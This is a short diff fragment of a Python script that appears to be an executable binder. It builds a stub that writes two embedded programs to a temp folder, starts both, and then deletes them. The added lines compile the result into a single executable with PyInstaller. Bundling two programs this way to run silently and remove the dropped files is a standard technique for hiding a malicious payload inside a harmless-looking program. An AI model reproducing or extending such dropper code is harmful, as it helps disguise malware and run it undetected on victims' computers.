@@ -47,3 +47,8 @@ b.write(Exe_B)
 b.close()
 os.system("start {tmp}\\\\{Name_A}.exe & start {tmp}\\\\{Name_B}.exe && del {tmp}\\\\{Name_A}.exe & del {tmp}\\\\{Name_B}.exe")
 """)
+
+if os.path.exists('Scripts/pyinstaller'):
+    os.system(f'pyinstaller -F {Final_Exe_Name}')
+    
+    
